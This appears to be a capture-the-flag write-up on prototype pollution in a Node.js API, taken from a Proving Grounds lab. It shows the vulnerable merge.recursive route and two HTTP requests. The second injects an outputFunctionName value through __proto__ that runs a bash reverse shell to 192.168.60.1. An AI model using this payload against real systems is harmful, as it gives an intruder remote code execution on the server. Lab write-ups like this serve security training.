# Prototype Pollution

Here is a writeup 

[Real-world JS - 1](https://blog.p6.is/Real-World-JS-1/)

# Example

This is an example from Charlotte on Proving Grounds. We had this API. `merge.recursive` was vulnerable to prototype pollution.

```jsx
let systems = {
    status: "online",
    lazers: "online",
    guns: "online",
    shields: "online",
    turrets: "online"
}

...

// API
app.post("/change_status", (req, res) => {

    Object.entries(req.body).forEach(([system, status]) => {

        if (system === "status") {
            res.status(401).end("Permission Denied.");
            return
        }
    });

    systems = merge.recursive(systems, req.body);

    if ("offline" in Object.values(systems)) {
        systems.status = "offline"
    }
    res.json(systems);
})
```

We could send this HTTP POST request to set shields to true.

```jsx
POST /change_status HTTP/1.1
Authorization: Basic VW5kZWFkRGluZ29HcnVtYmxpbmczNjk6U2hvcnR5U2tpbmxlc3NUcnVzdGVlNDU2
Content-Type: application/json
Content-Length: 29

{
    "shields": {
        "y": 1
    }
}
```

 We make a second request to do prototype pollution an execute a reverse shell via Node.

```jsx
POST /change_status HTTP/1.1
Authorization: Basic VW5kZWFkRGluZ29HcnVtYmxpbmczNjk6U2hvcnR5U2tpbmxlc3NUcnVzdGVlNDU2
Content-Type: application/json
Content-Length: 223

{
    "shields": {
        "__proto__": {
            "outputFunctionName":
"x;console.log(1);process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/192.168.60.1/80 0>&1\"');x"
        }
    } 
}
```

Then, I visited the homepage of the API since it loads the `shields` object and executes the prototype.